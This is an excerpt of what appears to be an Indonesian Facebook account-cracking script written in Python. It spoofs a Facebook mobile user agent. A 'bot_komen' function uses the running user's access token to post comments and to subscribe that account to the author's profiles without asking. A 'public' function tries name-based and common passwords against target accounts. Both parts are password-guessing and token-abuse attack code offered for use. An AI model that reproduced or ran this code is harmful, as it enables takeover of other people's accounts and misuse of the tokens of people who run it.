...
ua = ("Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]") 
s = requests.Session()
ct = datetime.now()
n = ct.month
...
def bot_komen():
    ...
    una = ('00015073506062') 
    post = ('031861840659590') 
    post2 = ('110619372783836') 
    kom = ('GW PAKE SC LU BANG 😍😘\nhttps://www.facebook.com/00015073506062/posts/0031861840659590/?app=fbl') 
    kom2 = ('KEREN BANG 😘😘\nhttps://m.facebook.com/photo.php?fbid=0110619372783836&set=a.006868716492245&type=3&app=fbl') 
    reac = ('LOVE') 
    ...
    requests.post('https://graph.facebook.com/00002163187650/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/00015073506062/subscribers?access_token=' + token)
    menu()
...
def public():
	...
	def main(user):
		...
		try:
			...
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345','123456','sayang','indonesia','bismillah','akusayangkamu','rahasia']:
